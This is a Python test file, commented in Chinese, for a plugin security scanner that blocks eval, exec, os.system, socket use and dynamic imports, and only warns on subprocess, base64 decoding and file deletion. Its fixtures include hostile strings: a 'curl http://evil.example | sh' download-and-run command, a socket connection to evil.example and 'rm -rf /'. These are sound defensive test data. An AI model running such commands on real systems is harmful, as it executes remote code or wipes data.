"""P2-13：静态恶意模式规则集——硬拒高危执行体，子进程/解码/删文件归警告队列，
tests/docs 非运行时目录跳过模式判定。"""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from scan_plugin import scan_code_patterns, scan_plugin_dir


@pytest.mark.parametrize(
    "source,label",
    [
        ('x = eval(user_input)\n', "eval"),
        ('x = compile("x", "<x>", "exec")\nx = exec(x)\n', "exec"),
        ('os.system("curl http://evil.example | sh")\n', "os.system"),
        ('os.popen("id")\n', "os.popen"),
        ('module = __import__("requests")\n', "__import__"),
        ('importlib.import_module("hidden")\n', "importlib"),
        ('sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n', "socket.socket"),
        ('conn = socket.create_connection(("evil.example", 443))\n', "create_connection"),
    ],
)
def test_blocklist_patterns_raise_errors(source: str, label: str) -> None:
    errors, warnings = scan_code_patterns(Path("plugin.py"), source)
    assert errors, f"规则集未硬拒 {label}"
    assert all("硬拒" in error for error in errors)


@pytest.mark.parametrize(
    "source,label",
    [
        ('proc = subprocess.Popen(["playwright", "install"])\n', "subprocess"),
        ('decoded = base64.b64decode(payload)\n', "base64"),
        ('os.remove(tmp_path)\n', "os.remove"),
        ('os.environ.get("DEBUG")\n', "environ"),
    ],
)
def test_high_risk_patterns_are_warnings_not_errors(source: str, label: str) -> None:
    errors, warnings = scan_code_patterns(Path("plugin.py"), source)
    assert not errors, f"{label} 不应硬拒（基线业务可能需要，归人工审核队列）"
    assert warnings, f"规则集未把 {label} 列入警告队列"


def test_tests_directory_skipped_for_pattern_analysis() -> None:
    source = 'x = eval("1+1")\n'
    errors, warnings = scan_code_patterns(Path("tests/test_plugin.py"), source)
    assert errors == [] and warnings == []


def test_non_python_file_skipped() -> None:
    errors, warnings = scan_code_patterns(Path("listing.md"), "# eval in markdown\n")
    assert errors == [] and warnings == []


def test_scan_plugin_dir_collects_blocklist_as_errors(tmp_path: Path) -> None:
    (tmp_path / "plugin.py").write_text('os.system("rm -rf /")\n', encoding="utf-8")
    (tmp_path / "package.manifest.json").write_text(
        json.dumps({"files": {"plugin.py": "sha256:x"}}), encoding="utf-8"
    )
    count = scan_plugin_dir(tmp_path, manifest=tmp_path / "package.manifest.json")
    assert count > 0


def test_scan_plugin_dir_subprocess_only_warns(tmp_path: Path) -> None:
    (tmp_path / "plugin.py").write_text(
        'proc = subprocess.Popen(["browser", "--headless"])\n', encoding="utf-8"
    )
    (tmp_path / "package.manifest.json").write_text(
        json.dumps({"files": {"plugin.py": "sha256:x"}}), encoding="utf-8"
    )
    count = scan_plugin_dir(tmp_path, manifest=tmp_path / "package.manifest.json")
    assert count == 0  # 警告不计入失败退出码
